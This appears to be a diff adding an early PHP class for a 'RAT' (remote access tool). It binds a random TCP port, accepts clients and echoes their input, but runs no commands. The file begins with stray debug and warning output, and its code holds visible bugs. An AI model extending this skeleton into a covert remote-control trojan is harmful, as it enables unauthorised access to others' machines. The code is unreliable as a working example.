@@ -1,0 +1,183 @@
+accept_connection()
+stream_set_blocking()
+Warning: socket_set_blocking(): supplied resource is not a valid stream resource in /home/insomniaque/workspace/PHP Socket RAT/rat.class.php on line 68
+accept_connection()
+<?php
+/*
+ * Project: iRAT
+ * 
+ * Created on Jan 11, 2010
+ * Written by Insomniaque
+ * 
+ */
+
+class rat
+{
+    /**
+     * Holds the PHP socket handle for use within the class.
+     */
+    private $socket;
+
+    /**
+     * Holds an array of all the spawned sockets (child sockets) that were
+     * created when a user connected to the server.
+     */
+    private $spawns = array ();
+
+    /**
+     * Holds the maximum number of connections.
+     */
+    private $maxconn;
+
+    /**
+     * Sets all of the variables required for the class and starts the socket.
+     * Then it'll start looping, connecting clients and running commands.
+     * 
+     * @access public
+     * @param $port The port to bind.
+     * @param $maxconn The maximum number of client connections.
+     */
+    public function __construct($port = 0, $maxconn = 1)
+    {
+        /**
+         * Check to see if the user has entered 0 as the port, and create a
+         * random port, if so.
+         */
+        if($port == 0)
+            $this->port = rand(81, 8079);
+        else
+            $this->port = $port;
+
+        /**
+         * Save the maximum connection number.
+         */
+        $this->maxconn = $maxconn;
+
+        /**
+         * Run our function to create the socket now.
+         */
+        if(!$this->createSocket())
+        {
+            echo "Failed creating or binding socket.\n";
+            return false;
+        }
+        else
+        {
+            echo "Socket has been created and binded.\n";
+        }
+
+        /**
+         * Turn non-blocking on so we can run multiple clients.
+         */
+        socket_set_blocking($this->socket, 0);
+
+        echo "Starting the data receiving loop.\n";
+        $this->startLoop();
+
+        return true;
+    }
+
+    /**
+     * This function will create the socket for later use.
+     * 
+     * @access private
+     * @return bool Returns true if the socket was created successfully,
+     *              returns false if there was an error.
+     */
+    private function createSocket()
+    {
+        /**
+         * Create a socket of IPv4 type using the TCP gateway.
+         */
+        $this->socket = socket_create(AF_INET, SOCK_STREAM, getprotobyname('tcp'));
+        if(!$this->socket)
+            return false;
+        echo "Socket has been created.\n";
+
+        /**
+         *  Attempt to bind the socket to localhost:[port]
+         */
+        do
+        {
+            if(!isset($i))
+                $i++;
+
+            $port = $this->port;
+            $bind = socket_bind($this->socket, 0, $port);
+
+            if(!$bind)
+            {
+                $i++;
+                $this->port = rand(79, 8079);
+            }
+        } while(!$bind && $i <= 5);
+
+        if($i == 5)
+            return false;
+        echo "Port ".$this->port." has been binded to the RAT.\n";
+
+        return true;
+    }
+
+    /**
+     * Start a loop running on our socket. We will check if we are getting
+     * data, accept connections and run any commands. When the connection
+     * is closed, we will return true.
+     * 
+     * @access private
+     * @return bool Returns false if the socket can't be listened to. Otherwise
+     *              returns true when the socket is closed.
+     */
+    private function startLoop()
+    {
+        if(socket_listen($this->socket, 3))
+        {
+            while(true)
+            {   
+                if(($newspawn = socket_accept($this->socket)) !== false)
+                {
+                    $this->spawns[] = $newspawn;
+                    echo "A new spawn has connected.";
+                } else
+                    echo "No new socket";
+                sleep(1000);
+
+                foreach($this->spawns as $key => $spawn)
+                {
+                    $data = trim(socket_read($spawn, 1024));
+                    if(strlen($data) > 0)
+                    {
+                        if($data == "exit")
+                        {
+                            socket_close($spawn);
+                            unset($this->spawns[$key]);
+                            echo "Spawn killed.\n";
+                        }
+                        if($data == "kill")
+                        {
+                            foreach($this->spawns as $key => $spawn)
+                            {
+                                socket_close($spawn);
+                                unset($this->spawns[$key]);
+                            }
+                            socket_close($this->socket);
+                            echo "Socket closed.\n";
+                            return true;
+                        }
+                        else
+                        {
+                            echo "Data: " . $data . "\n";
+                        }
+                    }
+                }
+            }
+        }
+        else
+        {
+            echo "Failure receiving data.\n";
+            return false;
+        }
+    }
+}
+?>
+
